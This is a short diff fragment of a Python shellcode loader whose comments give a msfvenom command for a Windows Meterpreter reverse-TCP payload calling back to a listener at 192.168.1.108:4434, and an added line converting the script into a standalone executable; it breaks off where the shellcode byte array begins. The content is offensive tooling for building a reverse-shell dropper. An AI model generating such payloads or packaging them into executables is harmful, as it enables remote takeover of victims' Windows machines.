@@ -5,6 +5,8 @@ import ctypes
 
 # Use MSFVENOM to create the payload and change the outgoing socket
 # EXAMPLE:  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.108 LPORT=4434 -f py
+# Then convert this script to an exe: python py_installer.py py_shell.py --onefile
+
 
 
 shellcode1 = bytearray(
